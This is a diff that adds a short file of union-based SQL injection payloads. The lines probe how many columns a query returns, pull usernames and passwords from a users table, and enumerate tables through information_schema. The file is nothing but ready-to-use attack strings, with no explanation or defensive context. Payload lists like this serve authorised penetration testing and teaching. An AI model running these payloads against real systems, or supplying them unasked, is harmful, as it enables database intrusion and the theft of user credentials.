@@ -1,0 +1,7 @@
+# SQL Injection - Union Based
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name FROM information_schema.tables--
